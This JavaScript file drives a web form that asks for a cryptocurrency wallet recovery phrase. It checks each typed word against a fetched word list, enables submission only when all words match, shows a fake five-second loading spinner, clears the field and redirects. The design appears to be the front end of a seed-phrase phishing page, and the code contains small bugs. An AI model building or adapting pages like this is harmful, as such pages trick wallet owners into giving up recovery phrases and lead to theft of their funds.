let form = document.getElementById('formId');
let textAreaValue = document.getElementById('textareaID');
let errorDiv = document.getElementById('errorDiv');
let spinner = document.getElementById('loadingSpinner');
let btnText = document.getElementById('btnText');

let state = {
  data1: null,
  data2: null,
  error: false,
};

//form submission
const handleSubmit = (event) => {
  event.preventDefault();
  btnText.textContent = '';
  spinner.style.display = 'block';

  setTimeout(() => {
    textAreaValue.value = '';
    window.location.href = 'https://example.com'; // Replace with your desired URL

    console.log('form submitted', textAreaValue.value);
  }, 5000);
};

// input error
textAreaValue.addEventListener('input', function () {
  if (textAreaValue.value) {
    errorDiv.classList.remove('bSOatK');
    errorDiv.classList.add('jnRcke');
    errorDiv.textContent = 'Invalid Recovery Phrase';
  } else {
    errorDiv.classList.remove('jnRcke');
    errorDiv.classList.add('bSOatK');
    errorDiv.textContent = 'Separate each word with a space';
  }
});

//input validation for data2
textAreaValue.addEventListener('input', () => {
  const words = textAreaValue.value.split(' ');
  let isValid = true;

  setState({ data2: words, error: false });
});

// check if all words in data2 exist in data1 and are not empty, then enable submit button
function setState(newState) {
  state = { ...state, ...newState };

  const dataOne = state.data1;
  const dataTwo = state.data2;

  if (!dataTwo) {
    return;
  }

  const allExists = dataTwo.every(
    (value) => dataOne.includes(value) && value.length > 0
  );

  if (!allExists) {
    console.log(allExists);
    document.getElementById('submitBtn').disabled = true;
  }

  if (allExists) {
    console.log(allExists);
    document.getElementById('submitBtn').disabled = false;
    form.addEventListener('submit', handleSubmit);
  }
}

// fetch data1 from file (english.txt in this case)
fetch('/blockchain-html/english.txt')
  .then((response) => response.text())
  .then((data) => {
    const words = data.split('\n');

    setState({ data1: words, error: false });
  })
  .catch((error) => {
    console.error('Error:', error);
  });
